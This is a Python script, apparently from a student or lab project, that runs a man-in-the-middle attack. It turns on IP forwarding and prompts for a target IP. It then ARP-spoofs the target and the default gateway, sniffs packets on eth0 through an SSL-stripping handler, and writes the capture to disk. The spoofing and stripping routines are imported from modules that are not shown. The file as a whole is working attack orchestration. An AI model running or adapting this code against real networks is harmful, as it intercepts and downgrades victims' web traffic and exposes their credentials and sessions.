import scapy.all as scapy
from bettercap import run_bettercap
import threading
import time

from networking import *
from arpspoof import *
from sslStripping import *
from server import *

def main():
    # If necessary, enable/disable ip_forwarding
    set_ip_forwarding(True)

    # # Start a Server for testing purposes
    server = Server()
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()

    # # Wait for the server to start
    while not server.is_ready():
        time.sleep(0.5)

    # Arp spoofing setup
    arp_spoofer = ArpSpoofer()
    target_ip = input("Target IP: ")
    gateway_ip = get_default_gateway_ip()

    # Begin capturing and processing/analyzing packets
    target_filter = "tcp port 80 or tcp port 443"
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter=target_filter)
    # capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip, filter="tcp")
    capture_device = scapy.AsyncSniffer(iface="eth0", prn=ssl_strip)
    # capture_device = scapy.AsyncSniffer(iface="eth0", filter=target_filter)
    capture_device.start()

    try:
        # Begin Spoofing on separate thread
        spoof_thread = threading.Thread(target=arp_spoofer.spoof, args=(gateway_ip, target_ip))
        spoof_thread.daemon = True
        spoof_thread.start()

        # Continue main thread...
        print("Continue...")

        # Rejoin server thread to main thread
        server_thread.join()

        # Rejoin spoof thread to main thread
        spoof_thread.join()

    except KeyboardInterrupt:
        # Restore ARP tables and remove the AITM position
        arp_spoofer.cleanup(gateway_ip, target_ip)

        # End packet capturing
        capture = capture_device.stop()
        writeCapture(capture)

        # Stop Server
        server.stop()

if __name__ == "__main__":
    main()